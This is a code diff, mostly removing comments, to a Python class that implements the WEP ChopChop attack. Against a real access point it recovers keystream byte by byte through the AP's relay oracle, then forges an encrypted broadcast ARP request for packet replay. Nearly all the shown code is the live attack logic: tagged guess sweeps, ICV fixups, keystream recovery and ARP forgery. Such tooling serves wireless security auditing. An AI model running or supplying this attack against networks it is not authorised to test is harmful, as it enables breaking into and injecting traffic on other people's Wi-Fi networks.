@@ -114,14 +114,9 @@ class WepChopChop:
     """ChopChop daemon: chop a captured ARP byte-by-byte via the AP oracle →
     recover keystream → forge a broadcast ARP → hand to replay."""
 
-    # Rolling-send spacing (aireplay sends one tagged guess per pps tick rather
-    # than send-one-wait — much faster; the relay arrives async and is matched
-    # by its MAC tag). ~3ms observed relay latency on hardware.
-    _SEND_INTERVAL_S = 0.003
-    # After a full 256-guess sweep, wait this long for trailing relays.
-    _DRAIN_S = 0.05
+    _SEND_INTERVAL_S = 0.003  # Rolling-send spacing
+    _DRAIN_S = 0.05  # After a full 256-guess sweep, wait this long for trailing relays.
     # A position with no relay across this many sweeps is the drop-short wall
-    # (small gap → brute) or the AP gone quiet.
     _MAX_SWEEPS = 3
     _HEARTBEAT_S = 5.0
     # The AP stops relaying once frames get too short, so the last keystream
@@ -173,12 +168,7 @@ class WepChopChop:
         self._cur_iv = b""
         self._cur_keyid = 0
         self._cur_cipher = b""
-        # Per-position random MAC tag (DA = FF:tag[0..2]:GUESS, byte-1 LSB is the
-        # sentinel flag). Regenerated each position so a stale relay from the
-        # previous byte carries a DIFFERENT tag and is simply ignored.
         self._cur_tag = b"\x00\x00\x00\x00"
-        # Set by the RX callback: the guess read out of the AP's relay (the MAC
-        # tag), or "sentinel relayed" (AP doesn't drop bad ICV).
         self._relayed_guess: Optional[int] = None
         self._sentinel_relayed = False
         self._last_heartbeat = 0.0
@@ -221,9 +211,7 @@ class WepChopChop:
         return body[:3], body[3], body[4:]
 
     def _pick_target(self):
-        """Choose a not-yet-stalled captured broadcast data frame to chop (ARP
-        or IP — the chop is protocol-agnostic; only the head reconstruction
-        differs)."""
+        """Choose a not-yet-stalled captured broadcast data frame to chop."""
         for raw in reversed(self.store.chop_candidates(self.bssid)):
             parsed = self._wep_body(raw)
             if not parsed:
@@ -234,8 +222,7 @@ class WepChopChop:
             self._cur_iv, self._cur_keyid, self._cur_cipher = iv, keyid, cipher
             self._bytes_done = 0
             self._bytes_total = len(cipher) - _CHOP_FLOOR
-            # Group header (plain) + a detail branch — each chop attempt is its
-            # own little tree.
+            # Group header (plain) + a detail branch
             self._log("[cyan]ChopChop:[/cyan] forging packet…")
             self._log(treelog.branch(
                 f"[dim]{len(cipher)}B cipher, ~{self._bytes_total} bytes to "
@@ -247,22 +234,17 @@ class WepChopChop:
     # ---- The byte-walk: linear, identity read from each relay ---------------
 
     async def _chop_and_forge(self, cipher: bytes) -> Optional[bytes]:
-        """Chop ``cipher`` down to the AP's drop-short wall — reading each
-        accepted byte out of the relay tag — then reconstruct the hidden head
-        from known structure (ARP or IP), verified against the captured frame's
+        """Chop ``cipher`` down to the AP's drop-short wall then reconstruct the
+        hidden head from known structure (ARP or IP), verified against the captured frame's
         own CRC, and forge a broadcast ARP from the recovered keystream. Returns
-        the ARP, or None.
-
-        Linear (no DFS): the relay's MAC tag tells us exactly which guess the AP
-        accepted, so there's no ambiguity to backtrack over."""
+        the ARP, or None."""
         full_len = len(cipher)
         if full_len < 40:                  # need >=40 ks bytes to forge the ARP
             return None
         body = bytes(cipher)
         ks_map: dict = {}                  # {position: recovered keystream byte}
 
-        # Chop from the end until the drop-short wall (or the always-known SNAP+
-        # ethertype floor — no point chopping bytes structure already gives us).
+        # Chop from the end until the drop-short wall
         while self._active and len(body) > _CHOP_FLOOR:
             self._bytes_done = max(self._bytes_done, full_len - len(body))
             self._maybe_heartbeat()
@@ -319,10 +301,7 @@ class WepChopChop:
 
     async def _sweep_for_relay(self, candidate) -> Optional[int]:
         """Blast a rolling stream of guess-tagged frames and return the guess
-        read back from the AP's relay (or _SENTINEL / None). ``candidate(guess)``
-        builds the cipher to send for a given guess (so the same sweep serves
-        both chopping and the wall-gap brute-force). A fresh MAC tag per call
-        makes stale relays from the previous position fall on the floor."""
+        read back from the AP's relay (or _SENTINEL / None)."""
         self._cur_tag = bytes(random.randint(0, 255) for _ in range(4))
         self._relayed_guess = None
         self._sentinel_relayed = False
@@ -353,7 +332,7 @@ class WepChopChop:
         frame WITHOUT the fixup → bad ICV)."""
         def candidate(guess: int) -> bytes:
             if guess == _SENTINEL:
-                return body[:-1]                       # no fixup → invalid ICV
+                return body[:-1]   # no fixup → invalid ICV
             return chop_last_byte_and_fixup(body, guess)
         return await self._sweep_for_relay(candidate)
 
@@ -521,8 +500,7 @@ class WepChopChop:
         return full[p] ^ accepted
 
     def _forge_arp(self, ks: bytearray) -> bytes:
-        """Forge a broadcast ARP request from us, encrypted with the recovered
-        keystream (reusing the chop target's IV) — the seed we hand to replay."""
+        """Forge a broadcast ARP request from us, encrypted with the keystream."""
         plain = arp_request_plaintext(
             sender_mac=self.source_mac,
             sender_ip=self._sender_ip, target_ip=self._target_ip,
@@ -547,9 +525,6 @@ class WepChopChop:
     # ---- Logging ------------------------------------------------------------
 
     def _set_state(self, state: str) -> None:
-        # Log the "waiting" status once on entering the seeding state (between
-        # chop attempts). The group root for an actual attempt is the "chopping
-        # IV …" header in _pick_target, so this is a plain standalone line.
         if state == "seeding" and self.state != "seeding":
             self._log("[cyan]ChopChop:[/cyan] waiting for ARP or IP frame…")
         self.state = state
